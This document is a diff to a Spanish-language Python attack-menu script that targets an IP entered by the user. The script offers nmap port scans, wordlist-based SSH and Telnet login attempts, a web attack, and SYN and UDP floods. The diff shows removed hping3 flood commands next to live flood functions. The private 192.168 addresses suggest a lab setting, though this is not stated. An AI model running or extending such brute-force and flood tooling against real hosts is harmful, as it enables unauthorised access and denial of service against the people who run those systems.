@@ -1,3 +1,4 @@
+import sys
 import subprocess
 import time
 import requests
@@ -19,7 +20,10 @@ def check_port(ip, port, timeout=2):
 
 def scan_ports(ip):
     print(f"[+] Escaneando puertos en {ip}...")
-    subprocess.run(["nmap", "-sS", "-sV", ip])
+    #subprocess.run(["nmap", "-sS", "-sV", ip])
+    subprocess.run(["nmap", "-F", "-T5", "--open", ip])
+
+
 
 def ssh_attempt(ip, wordlist_path):
     print(f"[+] Iniciando ataque SSH a {ip} con combinaciones usuario:contraseña...")
@@ -84,11 +88,6 @@ def web_attack(ip):
         print("[x] Web inaccesible")
 
 
-#def syn_flood(ip, port):
-#    print(f"[+] Lanzando SYN flood sobre {ip}:{port}...")
-#    subprocess.Popen(["hping3", "-S", "--flood", "-p", str(port), ip])
-
-
 def syn_flood(ip, port):
     print(f"[+] Verificando disponibilidad previa de {ip}:{port}")
     check_port(ip, port)
@@ -99,13 +98,6 @@ def syn_flood(ip, port):
     time.sleep(5)  # Espera unos segundos mientras se ejecuta el ataque
     print(f"[+] Verificando disponibilidad después del ataque")
     check_port(ip, port)
-
-
-
-
-#def udp_flood(ip, port):
-#    print(f"[+] Lanzando UDP flood sobre {ip}:{port}...")
-#    subprocess.Popen(["hping3", "--udp", "--flood", "-p", str(port), ip])
 
 
 def udp_flood(ip, port):
@@ -123,12 +115,14 @@ def udp_flood(ip, port):
 
 def menu():
 
-    ip = "192.168.1.150"     #input("Introduce la IP del objetivo: ")
+    
+    ip = input("Introduce la IP objetivo: ")               #"192.168.20.10"     
     file = "wordlist.txt"
 
     while True:
         print("\n")
         print("\n--- Menú de Ataques ---")
+        print("0. Change IP")
         print("1. Escanear puertos")
         print("2. Intentar acceso SSH")
         print("3. Intentar acceso Telnet")
@@ -139,8 +133,9 @@ def menu():
         print("\n")
 
         choice = input("Elige una opción: ")
-
-        if choice == '1':
+        if choice == '0':
+            ip = input("Introduce the new IP: ")  
+        elif choice == '1':
             scan_ports(ip)
         elif choice == '2':
             ssh_attempt(ip, file)
